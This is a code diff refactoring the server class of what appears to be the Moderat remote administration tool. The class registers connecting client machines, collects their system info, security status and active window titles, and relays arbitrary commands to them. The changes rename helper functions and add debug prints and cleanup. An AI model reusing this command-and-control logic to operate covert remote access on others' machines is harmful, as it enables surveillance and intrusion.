@@ -57,17 +57,17 @@ class ModeratServer:
 
             if self.sock:
 
-                data = get(self.sock, 'myinfo', 'status')
+                data = client_get(self.sock, 'myinfo', 'status')
 
                 if data == 'parent':
 
                     print '[+] New Client Connection (%s(%s))' % (self.address[0], self.address[1])
 
-                    data = get(self.sock, 'info', 'pcinfo')
+                    data = client_get(self.sock, 'info', 'pcinfo')
                     info = ast.literal_eval(data)
 
                     # Set timeout None
-                    self.sock.settimeout(0)
+                    self.sock.settimeout(None)
 
                     # Save connected socket
                     socket_index = self.address[1]
@@ -92,9 +92,9 @@ class ModeratServer:
                     else:
                         new_id = id_generator()
                         print '[+] Generating New ID (%s)' % new_id
-                        send(self.sock, 'setKeyPassword %s' % new_id)
+                        client_send(self.sock, 'setKeyPassword %s' % new_id)
 
-                    get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')
+                    temp_var = client_get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')
 
                 else:
                     print '[+] Initializing Streaming Socket'
@@ -105,7 +105,7 @@ class ModeratServer:
                             i = int(index)
 
                             if mode == 'streamingMode':
-                                data = get(self.sock, 'pcinfo', 'info')
+                                data = client_get(self.sock, 'pcinfo', 'info')
                                 info = ast.literal_eval(data)
 
                                 self.streaming_socks[i] = {}
@@ -130,7 +130,7 @@ class ModeratServer:
                 for i, k in self.streaming_socks.iteritems():
                     sock = self.streaming_socks[i]['sock']
                     try:
-                        data = get(sock, 'pcinfo', mode='pcinfo')
+                        data = client_get(sock, 'pcinfo', mode='pcinfo')
                         info = ast.literal_eval(data)
                         self.streaming_socks[i]['protection'] = info['protection']
                         self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
@@ -138,6 +138,7 @@ class ModeratServer:
                     except (socket.error, SyntaxError):
                         del self.socks[i]
                         del self.streaming_socks[i]
+                        del self.shared_socks[i]
                         break
                     except zlib.error:
                         pass
@@ -167,39 +168,20 @@ class ModeratServer:
                 self.moderator_threads[self.moderator_address[1]] = threading.Thread(target=self.moderator_listener, args=(self.moderator_sock, self.moderator_address[1]))
                 self.moderator_threads[self.moderator_address[1]].start()
 
-    def Receive(self, sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
-        received_data = ""
-        l = sock.recv(2)
-        while l:
-            received_data = received_data + l
-            if received_data.endswith(end):
-                break
-            else:
-                l = sock.recv(2)
-        if received_data.count(splitter):
-            print received_data
-            _type, message = received_data.split(splitter)
-            return _type, message[:-len(end)].decode('utf-8')
-        else:
-            return 'info', ''
 
-    def Send(self, sock, _data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
-        msg = (_data + end).encode('utf-8')
-        size = len(msg)
-        msg = mode + splitter + msg
-        sock.sendall(str(size) + '%:::%' + msg)
 
     def moderator_listener(self, sock, socket_id):
         while 1:
             try:
-                client_socket, data = self.Receive(sock)
+                client_socket, data = moderator_receive(sock)
                 if data == 'getClients':
                     output = self.command_get_clients()
                 else:
                     output = self.command_all(data, client_socket)
-                self.Send(sock, output, client_socket)
+                    print output
+                moderator_send(sock, output, client_socket)
             except socket.error:
-                print 'Socket Error'
+                print '[-] Socket Error'
                 return
             time.sleep(3)
 
@@ -207,7 +189,10 @@ class ModeratServer:
     # Moderator Commands
     def command_get_clients(self):
         for i, k in self.socks.iteritems():
-            self.shared_socks[i] = {}
+            print i
+            self.shared_socks[i] = {
+                'a': 'b'
+            }
             self.shared_socks[i]['ip_address'] = self.socks[i]['ip_address']
             self.shared_socks[i]['socket'] = self.socks[i]['socket']
             self.shared_socks[i]['ostype'] = self.socks[i]['ostype']
@@ -221,7 +206,8 @@ class ModeratServer:
         return str(self.shared_socks)
 
     def command_all(self, payload, client_socket):
-        return get(self.socks[int(client_socket)]['sock'], payload, client_socket)
+        print client_socket
+        return client_get(self.socks[int(client_socket)]['sock'], payload, client_socket)
 
 
 
